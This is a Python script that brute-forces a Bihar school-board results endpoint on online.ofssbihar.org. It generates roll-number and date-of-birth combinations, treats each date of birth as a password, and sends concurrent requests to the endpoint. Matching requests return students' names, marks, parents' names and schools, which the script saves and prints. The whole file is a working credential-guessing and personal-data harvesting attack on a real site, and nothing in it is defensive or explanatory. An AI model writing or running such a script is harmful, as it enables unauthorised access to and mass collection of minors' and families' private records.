import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed 

# Simple console input
start_datex = input("ENter DOB start date in format {m}-{d}-{yyyy} : ")
End_datex = input("ENter DOB End date in format {m}-{d}-{yyyy} : ")

x = input("Enter start roll no like= 2200100 :")
session = input("which year: ")
Rollcode = input("enter roll code : ")

# Start and end dates
start_date = start_datex
end_date = End_datex

# Define the constant value for x
constant_x = x
constant_x = int(constant_x)


# Split the start and end dates into day, month, and year
start_month, start_day, start_year = map(int, start_date.split('-'))
end_month, end_day, end_year = map(int, end_date.split('-'))

# Generate variations of date of birth
wordlist = []
x = constant_x
while x <= constant_x + 5:
    for year in range(start_year, end_year + 1):
        start_m = start_month if year == start_year else 1
        end_m = end_month if year == end_year else 12
        for month in range(start_m, end_m + 1):
            start_d = start_day if year == start_year and month == start_month else 1
            end_d = end_day if year == end_year and month == end_month else 31
            for day in range(start_d, end_d + 1):
                wordlist.append(f"{x}:{month}-{day}-{year}")
        x += 1

# Write the wordlist to a file
with open("301N305.txt", "w") as f:
    for item in wordlist:
        f.write("%s\n" % item)







# Define the path to your wordlist file
wordlist_path = '301N305.txt'

# Function to perform the requests and parse the response
def perform_requests(user, password):
    # First Request
    url_1 = "https://online.ofssbihar.org/ONLINE_CAF/JrCAFForm.aspx/fillDistrict"
    payload_1 = json.dumps({'intStateId': '1'})
    headers_1 = {
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://online.ofssbihar.org",
        "Priority": "u=1, i",
        "Referer": "https://online.ofssbihar.org/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    }

    response_1 = requests.post(url_1, data=payload_1, headers=headers_1)
   

    # Second Request
    url_2 = "https://online.ofssbihar.org/ONLINE_CAF/JrCAFForm.aspx/fillBSEMark"
    payload_2 = json.dumps({
        'vchRollNo': user,
        'intYear': session,
        'vchRollCd': Rollcode,
        'vchDOB': password,
        'intExamType': 1
    })
    headers_2 = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
        "Content-Length": "94",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://online.ofssbihar.org",
        "Priority": "u=1, i",
        "Referer": "https://online.ofssbihar.org/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    }

    response_2 = requests.post(url_2, data=payload_2, headers=headers_2)
   

    # Parse JSON Response
    response_json = response_2.json()

    if 'd' in response_json:
        data_list = response_json['d']
        
        with open('BSEB10thstudent_info.txt', 'w') as file:
            # Assuming data_list is a list of dictionaries
            for data in data_list:
                student_name = data.get('NAME', 'N/A')
                total_marks = data.get('TOT', 'N/A')
                father_name = data.get('FNAME', 'N/A')
                mother_name = data.get('MNAME', 'N/A')
                school_name = data.get('SCHOOL', 'N/A')
            
                info_string = f"Roll No: {user}, DOB: {password}, Student Name: {student_name}, Total Marks: {total_marks}, Father's Name: {father_name}, Mother's Name: {mother_name}, School Name: {school_name}"
            
                # Write the string to the file
                file.write(info_string + "\n")
                file.flush()
                print(info_string)


                print(f"ROll NO: {user}")
                print(f"DOB: {password}")
                print(f"Student Name: {student_name}")
                print(f"Total Marks: {total_marks}")
                print(f"Father's Name: {father_name}")
                print(f"Mother's Name: {mother_name}")
                print(f"School Name: {school_name}")
                print("                ")
                
            
    else:
        print("Failure: No data found")

# Read the wordlist and process each line concurrently
with open(wordlist_path, 'r') as file:
    credentials = [line.strip().split(':') for line in file]

# Using ThreadPoolExecutor to handle multiple requests simultaneously
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(perform_requests, user, password) for user, password in credentials]
    
    for future in as_completed(futures):
        try:
            future.result()
        except Exception as e:
            print(f"An error occurred: {e}")
